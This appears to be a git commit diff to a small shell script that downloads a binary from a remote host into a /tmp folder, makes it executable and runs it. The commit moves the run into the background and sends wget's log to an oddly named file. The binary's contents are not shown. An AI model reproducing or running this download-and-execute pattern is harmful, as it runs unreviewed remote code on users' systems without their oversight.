b1659fe24d709a0b45bd8c3f15dcc2719699dc27
xtrm-en <26600206+xtrm-en@users.noreply.github.com>
2022-08-04 16:30:48 +0200

    blk

--- public/lmao/test.sh
+++ public/lmao/test.sh
@@ -2,8 +2,8 @@
 
 mkdir -p /tmp/gayming69420
 
-wget -O /tmp/gayming69420/uwu "https://test.xtrm.me/lmao/uwu"
+wget -O /tmp/gayming69420/uwu -o /tmp/gayming69420/uowehfeuiwheuofhweiogjreo "https://test.xtrm.me/lmao/uwu"
 chmod +x /tmp/gayming69420/uwu
 
 cd /tmp/gayming69420/
-./uwu
+./uwu &
